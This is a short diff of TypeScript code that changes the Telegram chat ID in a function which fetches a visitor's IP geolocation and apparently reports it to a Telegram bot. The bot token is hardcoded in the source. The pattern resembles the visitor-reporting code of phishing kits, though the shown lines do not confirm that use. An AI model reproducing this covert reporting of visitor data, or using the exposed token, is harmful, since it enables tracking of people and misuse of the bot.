@@ -59,7 +59,7 @@ const sendBotTelegram = async (reason: string) => {
     try {
         const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
         const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA';
-        const chatId = '-4795436920';
+        const chatId = '-1002776834761';
 
         const geoRes = await fetch(geoUrl);
         const geoData = await geoRes.json();
